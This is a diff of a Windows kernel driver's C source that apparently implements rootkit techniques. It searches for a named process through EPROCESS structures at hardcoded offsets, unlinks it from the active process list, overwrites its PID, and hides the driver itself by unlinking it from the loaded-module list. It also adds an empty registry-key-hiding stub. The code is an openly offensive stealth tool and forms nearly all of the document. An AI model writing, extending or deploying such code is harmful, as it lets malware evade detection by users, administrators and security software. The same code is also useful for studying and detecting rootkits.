@@ -1,23 +1,19 @@
+#include "Driver.h"
 
-#include <ntifs.h>
-
-#include <ntddk.h>
-#include <wdf.h>
-#include <stdlib.h>
 
 #pragma warning (disable : 4100 4201)
 
-DRIVER_INITIALIZE DriverEntry;
 
-typedef unsigned long       DWORD;
 
 void OnUnload(IN PDRIVER_OBJECT DriverObject) {
     DbgPrintEx(0, 0, "Bye Bye !!!\n");
 }
 //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm
+// 
 //Windows ActiveProcessLinks offset:0x448
-//Windows Flink offset:0x0 gvf
+//Windows Flink offset:0x0
 //Windows Blink offset:0x8
+
 int GetImageFileNameOffset(char* name) {
     PEPROCESS currentproc = PsGetCurrentProcess();
     for (int i = 0; i < PAGE_SIZE; i++)
@@ -30,7 +26,7 @@ int GetImageFileNameOffset(char* name) {
     DbgPrintEx(0, 0, "Process not found...\n");
     return -1;
 }
-int SearchEPROCESSbyOffset(int offset, char *target) {
+int SearchAndRemoveEPROCESSbyOffset(int offset, char *target) {
     PEPROCESS currentproc = PsGetCurrentProcess();
     DbgPrintEx(0, 0, "ImageFileName: %s\n", (unsigned char*)((unsigned char*)currentproc + offset));
     PLIST_ENTRY listentry = (LIST_ENTRY*)((unsigned char*)currentproc+0x448);
@@ -46,6 +42,8 @@ int SearchEPROCESSbyOffset(int offset, char *target) {
         listentry = listentry->Flink;
         if (strcmp(name, target) == 0) {
             int pid = *(int*)((unsigned char*)process + 0x440);
+            HideProcess(pid);
+            *(int*)((unsigned char*)process + 0x440) = NULL;//is this illegal ?
             DbgPrintEx(0, 0, "PID: %d\n", pid);
             return pid;
         }
@@ -80,53 +78,6 @@ int HideProcess(int targetPID) {
     return 1;
 }
 
-
-
-
-
-
-
-
-
-
-//https://www.nirsoft.net/kernel_struct/vista/LDR_DATA_TABLE_ENTRY.html
-typedef unsigned short WORD, * PWORD, * LPWORD;
-
-typedef struct _LDR_DATA_TABLE_ENTRY
-{
-    LIST_ENTRY InLoadOrderLinks;
-    LIST_ENTRY InMemoryOrderLinks;
-    LIST_ENTRY InInitializationOrderLinks;
-    PVOID DllBase;
-    PVOID EntryPoint;
-    ULONG SizeOfImage;
-    UNICODE_STRING FullDllName;
-    UNICODE_STRING BaseDllName;
-    ULONG Flags;
-    WORD LoadCount;
-    WORD TlsIndex;
-    union
-    {
-        LIST_ENTRY HashLinks;
-        struct
-        {
-            PVOID SectionPointer;
-            ULONG CheckSum;
-        };
-    };
-    union
-    {
-        ULONG TimeDateStamp;
-        PVOID LoadedImports;
-    };
-    struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
-    PVOID PatchInformation;
-    LIST_ENTRY ForwarderLinks;
-    LIST_ENTRY ServiceTagLinks;
-    LIST_ENTRY StaticLinks;
-} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
-
-
 int HideDriverSection(PDRIVER_OBJECT DriverObject) {
     PVOID DriverSection = DriverObject->DriverSection;
     PLDR_DATA_TABLE_ENTRY TableEntry  = (PLDR_DATA_TABLE_ENTRY)DriverSection;
@@ -143,7 +94,9 @@ int HideDriverSection(PDRIVER_OBJECT DriverObject) {
     DbgPrintEx(0, 0, "Driver should be hidden\n");
     return 1;
 }
-
+int HideSpecificRegKey() {
+    return 0;
+}
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
     // NTSTATUS variable to record success or failure
     DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
